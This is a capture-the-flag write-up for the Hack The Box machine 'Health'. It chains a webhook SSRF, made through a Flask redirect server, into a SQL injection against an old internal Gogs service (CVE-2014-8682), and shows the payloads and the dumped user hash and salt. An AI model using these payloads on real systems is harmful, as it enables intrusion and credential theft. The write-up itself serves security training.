Yo,
welcome to write up for machine Health from Hackthebox.
Starting of as always with nmap scan of all ports

```
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-14 17:41 EST
Nmap scan report for 10.10.11.176 (10.10.11.176)
Host is up (0.062s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 32:b7:f4:d4:2f:45:d3:30:ee:12:3b:03:67:bb:e6:31 (RSA)
|   256 86:e1:5d:8c:29:39:ac:d7:e8:15:e6:49:e2:35:ed:0c (ECDSA)
|_  256 ef:6b:ad:64:d5:e4:5b:3e:66:79:49:f4:ec:4c:23:9f (ED25519)
80/tcp   open     http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HTTP Monitoring Tool
3000/tcp filtered ppp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

There are three ports open. Standartly port 22 being ssh and port 80 being apache web server. Unusual is port 3000 which is filtered. I'll keep that in mind
if I ever find a way to get there for example with SSRF. 

Let's visit the website first because there's nothing much to do with ssh. 

IMG1

The page shows us hostname health.htb. I'll add it to my `/etc/hosts` file with simple command:

```

echo "10.10.11.166 health.htb" >> /etc/hosts

```

Visiting the page with the hostname gives the same page. On the bottom there is 2014 @Copyright meaning this website is using old version of something 
but first we need to figure out what.
Now let's test the webhook. I'll set up netcat listening on port 9001 and basic flask app that redirects to localhost:

```
import os 
from flask import Flask, redirect, request

app = Flask(__name__)

@app.route("/")
def redir():
    return redirect('http://localhost/')


if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=80) 
```

And test the page webhook: 

IMG2

It returns the health.htb landing page on netcat listener. I remember that there is filtered port 3000 so let's try to visit that. 
I'll just change the redirect in flask app to `localhost:3000` and test the webhook same way as before. The site that returns to us 
on netcat shows us this:

```
2014 GoGits \u00b7 Version: 0.5.5.1010 Beta
```

Which is old version of git. Searching for exploits for this version gives us CVE 2014-8682 with this proof of concept

```
Proof of Concept
================

http://www.example.com/api/v1/users/search?q='/**/and/**/false)/**/union/**/
select/**/null,null,@@version,null,null,null,null,null,null,null,null,null,null,
null,null,null,null,null,null,null,null,null,null,null,null,null,null/**/from
/**/mysql.db/**/where/**/('%25'%3D'
```

Using this as our payload gives us 3 in one field meaning we can extract things from there.



Replacing our redirect in flask using commas as separators and searching how the database looks give us this payload:

```
return redirect("http://127.0.0.1:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/1,2,name||','||email||','||passwd||','||salt,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27/**/from/**/user--/**/-")
```

Returns this on netcat:

```
{"webhookUrl":"http:\/\/10.10.14.207:9001","monitoredUrl":"http:\/\/10.10.14.207","health":"up","body":"{\"data\":[{\"username\":\"susanne\",\"avatar\":\"\/\/1.gravatar.com\/avatar\/c11d48f16f254e918744183ef7b89fce\"},{\"username\":\"susanne,admin@gogs.local,66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37,sO3XIbeW14\",\"avatar\":\"\/\/1.gravatar.com\/avatar\/15\"}],\"ok\":true}","message":"HTTP\/1.0 302 FOUND","headers":{"Content-Type":"application\/json; charset=UTF-8","Content-Length":"301","Location":"http:\/\/127.0.0.1:3000\/api\/v1\/users\/search?q=')\/**\/union\/**\/all\/**\/select\/**\/1,2,name||','||email||','||passwd||','||salt,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27\/**\/from\/**\/user--\/**\/-","Server":"Werkzeug\/2.0.2 Python\/3.10.7","Date":"Thu, 19 Jan 2023 22:01:48 GMT","Set-Cookie":"_csrf=; Path=\/; Max-Age=0"}}^C
```